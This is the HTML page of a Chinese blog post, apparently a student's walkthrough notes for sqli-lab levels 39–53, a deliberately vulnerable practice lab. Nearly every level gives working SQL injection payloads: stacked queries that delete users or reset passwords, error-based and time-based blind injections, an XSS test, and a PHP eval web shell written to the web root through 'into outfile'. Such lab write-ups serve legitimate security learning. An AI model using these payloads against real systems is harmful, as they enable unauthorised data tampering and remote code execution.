@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/ar.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/ar.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/ar.jpg">
+  <link rel="mask-icon" href="/images/ar.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"0w0.host","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Sqli-lab 过关笔记 Less 39-Less 53">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-lab Less 39-Less 53">
+<meta property="og:url" content="http://0w0.host/2020/09/09/sqli-lab-Less-39-Less-53/index.html">
+<meta property="og:site_name" content="Sunr&#39;s Blog">
+<meta property="og:description" content="Sqli-lab 过关笔记 Less 39-Less 53">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/09/09/8xHFoXUtyJmTGnv.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/09/L3Bb5rfMkpKunZA.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/09/ZE6vis3LtPj5hRN.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/09/qzUVlPeynMDxcZ8.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/09/fb2tBWZysKXqU3Y.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/09/lfadW2RSUb9hup6.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/09/o2PrFykSJg6HGbs.png">
+<meta property="article:published_time" content="2020-09-09T10:00:23.000Z">
+<meta property="article:modified_time" content="2020-09-10T14:09:05.974Z">
+<meta property="article:author" content="Sunr">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="sqli-lab">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/09/09/8xHFoXUtyJmTGnv.png">
+
+<link rel="canonical" href="http://0w0.host/2020/09/09/sqli-lab-Less-39-Less-53/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sqli-lab Less 39-Less 53 | Sunr's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Sunr's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sunr's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://0w0.host/2020/09/09/sqli-lab-Less-39-Less-53/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ar.jpg">
+      <meta itemprop="name" content="Sunr">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sunr's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqli-lab Less 39-Less 53
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-09-09 18:00:23" itemprop="dateCreated datePublished" datetime="2020-09-09T18:00:23+08:00">2020-09-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-10 22:09:05" itemprop="dateModified" datetime="2020-09-10T22:09:05+08:00">2020-09-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2020/09/09/sqli-lab-Less-39-Less-53/" class="post-meta-item leancloud_visitors" data-flag-title="sqli-lab Less 39-Less 53" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/09/09/sqli-lab-Less-39-Less-53/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/09/sqli-lab-Less-39-Less-53/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.1k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Sqli-lab-过关笔记-Less-39-Less-53"><a href="#Sqli-lab-过关笔记-Less-39-Less-53" class="headerlink" title="Sqli-lab 过关笔记 Less 39-Less 53"></a>Sqli-lab 过关笔记 Less 39-Less 53</h1><a id="more"></a>
+<h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>这里加\后判断为数字型注入<br>因为是堆叠注入直接尝试删除用户Sunr</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="keyword">delete</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> &quot;Sunr&quot; #</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/09/09/8xHFoXUtyJmTGnv.png" alt="image.png"><br>发现并没有被删除</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="keyword">update</span> users <span class="keyword">set</span> password<span class="operator">=</span>&quot;admin&quot; <span class="keyword">where</span> username<span class="operator">=</span>&quot;Sunr&quot;; #</span><br></pre></td></tr></table></figure>
+<p>我们来使用更新的话可以看到<br><img src="https://i.loli.net/2020/09/09/L3Bb5rfMkpKunZA.png" alt="image.png"><br>passwd成功更新</p>
+<hr>
+<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>测试闭合方式为单引号加小括号闭合<br>开始构造语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) ; update users set password=&quot;Sunr&quot; where username=&quot;Sunr&quot;; or (&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>这里我们不再构造第一个语句，直接尝试更新用户名密码<br><img src="https://i.loli.net/2020/09/09/ZE6vis3LtPj5hRN.png" alt="image.png"><br>成功</p>
+<hr>
+<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>首先探测闭合方式确定为数字型注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span>; <span class="keyword">select</span> &quot;&lt;?php eval($_POST[x]);?&gt;&quot; <span class="keyword">into</span> outfile &quot;C:/PHPStudy/WWW/sqli/Less-41/1.php&quot;; #</span><br></pre></td></tr></table></figure>
+<p>这里我们尝试写入shell<br><img src="https://i.loli.net/2020/09/09/qzUVlPeynMDxcZ8.png" alt="image.png"><br>成功</p>
+<hr>
+<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>打开这一关又是熟悉的二次注入<br>试试创建新用户<br><img src="https://i.loli.net/2020/09/09/fb2tBWZysKXqU3Y.png" alt="image.png"><br>太鸡贼了，害<br>试试登录界面吧<br><img src="https://i.loli.net/2020/09/09/lfadW2RSUb9hup6.png" alt="image.png"><br>唔不行，用户名不行那就试试密码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;#&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>嘿嘿，果然是密码不加过滤</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-42/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>继续尝试写shell</p>
+<p>成功</p>
+<p>不过，，，</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; select &quot;&lt;script&gt;alert(/1/)&lt;/script&gt;&quot; #</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/09/09/o2PrFykSJg6HGbs.png" alt="image.png"><br>可能我是闲得蛋疼吧</p>
+<hr>
+<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>又是一样的界面，例行进行探测闭合方式<br><code>&#39;)</code>闭合<br>同上题构造语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;); select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-43/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>还是熟悉的套路，首先探测闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>确定为单引号闭合<br>同上题构造语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-44/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>同上题，探测闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) or 1=1 #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>为<code>&#39;)</code>闭合</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;); select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-45/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<blockquote>
+<p>注：以上写shell的条件均要满足Less-7的条件</p>
+</blockquote>
+<hr>
+<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>又回到了熟悉的GET注入<br>又有提示：Please input parameter as SORT with numeric value<br>嗯，于是就改成</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?sort<span class="operator">=</span>id</span><br></pre></td></tr></table></figure>
+<p>探测一下闭合方式<br>估计大概的sql语句应该是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">value</span>;</span><br></pre></td></tr></table></figure>
+<p>确实是典型的order by注入<br>我们来构造语句，我们直接使用报错注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure>
+<p>成功爆出库</p>
+<hr>
+<h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>首先探测出是单引号闭合<br>根据上题直接闭合构造语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="string">&#x27;||updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功爆出库</p>
+<hr>
+<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>这次是盲注，没有报错提示不能使用报错注入<br>走一波时间盲注<br>探测为数字型<br>构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,(<span class="keyword">select</span>(<span class="number">1</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">2</span>)))aaaa)) # </span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>同上，先判断闭合方式再构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||if(1=2,1,(select(1)from(select(sleep(2)))aaaa)) or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>探测闭合为数字型后直接</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure>
+<p>居然成功了<br>然后感觉不太对，emmm<br>看了看源码发现</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">···</span><br><span class="line">if (mysqli_multi_query($con1, $<span class="keyword">sql</span>))</span><br><span class="line">···</span><br></pre></td></tr></table></figure>
+<p>这里执行sql语句的函数是mysqli_multi_query(),可以一次执行多条语句<br>也就是之前的堆叠注入，这里不再演示</p>
+<hr>
+<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>同上，先判断闭合方式再构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||updatexml(1,concat(0x7e,(select database()),0x7e),1);select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-45/1.php&quot;; or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功<br>同样这也是用mysqli_multi_query()<br>存在堆叠注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="string">&#x27;;select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-51/1.php&quot;; or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>这一题是盲注<br>其余同上，直接贴语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> ;<span class="keyword">select</span> &quot;&lt;?php eval($_POST[x]);?&gt;&quot; <span class="keyword">into</span> outfile &quot;C:/PHPStudy/WWW/sqli/Less-52/1.php&quot;; <span class="comment">-- d d</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>同上，直接贴语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="string">&#x27;;select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-53/1.php&quot;; or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<hr>
+
+    </div>
+
+    <div>
+      
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i> 笔记</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 渗透</a>
+              <a href="/tags/sqli-lab/" rel="tag"><i class="fa fa-tag"></i> sqli-lab</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/09/06/Sqli-lab-Less-23-Less-38/" rel="prev" title="sqli-lab Less 23-Less 38">
+      <i class="fa fa-chevron-left"></i> sqli-lab Less 23-Less 38
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/09/10/sqli-lab-Less-54-Less-65/" rel="next" title="sqli-lab Less 54-Less 65">
+      sqli-lab Less 54-Less 65 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Sqli-lab-%E8%BF%87%E5%85%B3%E7%AC%94%E8%AE%B0-Less-39-Less-53"><span class="nav-number">1.</span> <span class="nav-text">Sqli-lab 过关笔记 Less 39-Less 53</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-39"><span class="nav-number">1.1.</span> <span class="nav-text">Less-39</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-40"><span class="nav-number">1.2.</span> <span class="nav-text">Less-40</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-41"><span class="nav-number">1.3.</span> <span class="nav-text">Less-41</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-42"><span class="nav-number">1.4.</span> <span class="nav-text">Less-42</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-43"><span class="nav-number">1.5.</span> <span class="nav-text">Less-43</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-44"><span class="nav-number">1.6.</span> <span class="nav-text">Less-44</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-45"><span class="nav-number">1.7.</span> <span class="nav-text">Less-45</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-46"><span class="nav-number">1.8.</span> <span class="nav-text">Less-46</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-47"><span class="nav-number">1.9.</span> <span class="nav-text">Less-47</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-48"><span class="nav-number">1.10.</span> <span class="nav-text">Less-48</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-49"><span class="nav-number">1.11.</span> <span class="nav-text">Less-49</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-50"><span class="nav-number">1.12.</span> <span class="nav-text">Less-50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-51"><span class="nav-number">1.13.</span> <span class="nav-text">Less-51</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-52"><span class="nav-number">1.14.</span> <span class="nav-text">Less-52</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-53"><span class="nav-number">1.15.</span> <span class="nav-text">Less-53</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sunr"
+      src="/images/ar.jpg">
+  <p class="site-author-name" itemprop="name">Sunr</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/sunr0" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;sunr0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:a7k6b1c@163.com" title="E-Mail → mailto:a7k6b1c@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=865142767&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;865142767&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sunr</span>
